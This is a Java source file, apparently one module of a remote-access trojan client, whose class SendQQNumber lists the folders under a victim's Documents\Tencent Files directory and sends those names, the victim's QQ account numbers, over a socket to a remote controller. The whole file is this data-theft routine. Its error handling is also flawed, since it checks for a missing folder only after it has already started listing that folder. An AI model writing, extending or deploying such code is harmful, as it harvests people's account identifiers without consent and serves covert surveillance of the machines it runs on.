package me.client.send;

import me.client.Client;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import java.io.*;
import java.net.Socket;

public class SendQQNumber extends Thread {
    Socket socket;

    public SendQQNumber(Socket socket) {
        this.socket = socket;
    }

    public void SendQQNumbers() {
        File file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files");
        SendMessage.SendHead(MessageFlags.SHOW_QQNUMBERWINDOW,socket);
        for (String string : file.list()) {
            if (file.list() != null) {
                if (string.indexOf("All Users") == -1) {
                    SendMessage.Send(MessageFlags.GET_QQNUMBER,string.getBytes(),socket);
                }
            }else {
                SendMessage.SendHead(MessageFlags.GET_QQNUMBER_ERROR,socket);
            }
        }
    }
}